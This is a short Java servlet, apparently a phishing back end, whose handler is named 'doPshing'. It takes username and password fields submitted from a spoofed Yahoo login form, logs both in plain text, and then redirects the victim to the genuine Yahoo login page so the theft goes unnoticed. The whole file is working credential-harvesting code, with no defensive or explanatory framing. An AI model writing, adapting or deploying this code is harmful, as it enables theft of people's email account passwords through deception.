package com.test;

import org.apache.log4j.Logger;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * Created by IntelliJ IDEA.
 * User: udoluweera
 * Date: 8/10/11
 * Time: 11:23 AM
 * To change this template use File | Settings | File Templates.
 */
public class YahooLoginService extends HttpServlet {

    private static Logger log = Logger.getLogger(YahooLoginService.class);

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPshing(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPshing(req, resp);    }

    private void doPshing(HttpServletRequest req, HttpServletResponse resp) {

        log.error("****************************************************************");
        log.error("****************************************************************");
        log.error("****************************************************************");

        // <form method="post" action="https://login.yahoo.com/config/login?" autocomplete="" name="login_form" id="login_form" onsubmit="return hash2(this)">

        String userName = (String) req.getAttribute("login");
        String password = (String) req.getAttribute("passwd");

        String paramUN = req.getParameter("login");
        String paramPwd = req.getParameter("passwd");


        log.error(" <><><><><<<><><><<><> User Name Is " + paramUN);
        log.error(" <><><><><<<><><><<><>  Password Is " + paramPwd);


        log.error("****************************************************************");
        log.error("****************************************************************");
        log.error("****************************************************************");

        try {
            resp.sendRedirect(resp.encodeRedirectURL("https://login.yahoo.com/config/login_verify2?&.src=ym"));
        } catch (IOException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }


    }


}
